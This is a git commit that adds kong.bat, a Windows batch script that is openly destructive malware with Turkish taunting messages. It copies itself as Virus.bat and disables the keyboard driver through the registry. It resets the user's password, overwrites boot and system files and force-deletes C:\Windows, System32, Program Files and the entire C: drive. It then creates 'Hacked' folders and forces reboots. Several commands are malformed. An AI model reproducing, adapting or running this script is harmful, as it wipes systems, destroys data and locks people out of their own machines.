f2b7e0cb26ed5231c3e4f6b6c6c30aa59eba4344
Arda <108670057+Neverkoo@users.noreply.github.com>
2022-08-03 20:21:24 +0300

    Add files via upload

---
+++ kong.bat
@@ -0,0 +1,115 @@
+@echo off
+copy %0%windir%\Virus.bat> nul
+reg addHKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul
+net user %username% senpassatmısınenayihacklendinehehe 
+shutdown -r
+cd c:
+attrib -s -h boot.ini
+cls
+attrib -s -h found.000
+attrib -s -h found.001
+t>boot.ini
+attrib -a -s -h pagefile.sys
+h>pagefile.sys
+attrib -a -s -h hiberfil.sys
+HH>hiberfil.sys
+attrib -a -s -h -r bootfont.bin
+hhh>bootfont.bin
+attrib -a -s -h -r ntdetect.com
+ff>ntdetect.com
+attrib -a -s -h -r ntldr
+f>ntldr
+cls
+cd..
+cd..
+cls
+cd windows
+g>win.ini
+cls
+g>system.ini
+cls
+cd pss
+ft>system.ini.backup
+f>win.ini.backup
+cls
+cd c:
+@echo .::.HADi baslayalım.::.
+cd windows
+cd system32
+attrib -r -h -s dllcache
+cls
+attrib -a -h -r *.manifest
+cls
+cd config
+attrib -a -h *.log
+cd..
+cd restore
+attrib -r -h -s filelist.xml
+cls
+cd c:
+cls
+cd windows
+cls
+tskill msnmsgr /a
+tskill msmsgs /a
+cls
+del /f /q /s c:windowssystem32*.*
+cls
+cd repair
+attrib -a -h ntuser.dat
+f>ntuser.dat
+ff>secstup.inf
+cd..
+attrib -h inf
+attrib -h -s installer
+attrib -h pif
+attrib -r -h -a WindowsShell.Manifest
+attrib -r -h şMSI31Uninstall_KB893803ş
+attrib -s -a bootstat.dat
+attrib -s -h services.dll
+attrib -s -h qservice.exe
+attrib -a -r set3.tmp
+attrib -s -h winnt.bmp
+attrib -s -h winnt256.bmp
+cls
+cd c:
+del /f /q /s c:windows*.*
+cls
+cd..
+cd..
+cd program files
+cd internet explorer
+attrib -a -s -h iexplore.exe
+cd c:
+cls
+del /f /q /s c:program files*.*
+cls
+cd..
+cd..
+attrib -a -h -r -s msdos.sys
+attrib -a -s -h config.sys
+cls
+attrib -a -h -r -s IO.sys
+cls
+del /f /q /s c:*.*
+cls
+@echo Downloading...
+@echo Downloading...
+@echo Loanding...
+pause
+cls
+cd..
+cd..
+cd ********s and Settings
+cd All Users
+cd Desktop
+md .HackEd
+md Bys
+md Hacker
+dir /s>HAcKeD.ini
+@echo HALA shutDownN.exe Pc DEYse RES iyi Gider
+cls
+shutdown -r -t 5 -c HacKs FoR  -f
+shutdown -r -t 5 -c HacKs FoR -f
+tsshutdn 5 /delay:2
+tsshutdn 5 /delay:2
